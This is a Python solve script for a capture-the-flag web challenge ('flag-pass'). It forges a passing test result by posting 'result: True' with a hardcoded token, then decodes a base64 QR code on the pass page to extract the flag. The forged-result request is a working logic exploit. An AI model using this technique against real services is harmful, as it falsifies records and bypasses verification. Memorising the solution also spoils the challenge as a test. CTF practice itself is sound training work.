import requests
import re
import PIL.Image
import base64
import io
from pyzbar.pyzbar import decode

url = "http://flag-pass.challs.olicyber.it"
token = "8218d355-38ff-4bc3-9336-adf7f1ba55be"

r = requests.get(url + "/test")
test_id = re.search(
    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", r.text
)[0]

r = requests.post(
    url + "/record_result",
    json={"token": token, "test_id": test_id, "result": True},
)

assert r.status_code == 200

r = requests.get(url + "/pass", params={"id": test_id})
x = re.search(r"base64,([\w/+=]+)\"", r.text)[1]
img = PIL.Image.open(io.BytesIO(base64.b64decode(x)))
decoded = decode(img)
flag = re.search(r"flag{.+}", decoded[0].data.decode())[0]

print(flag)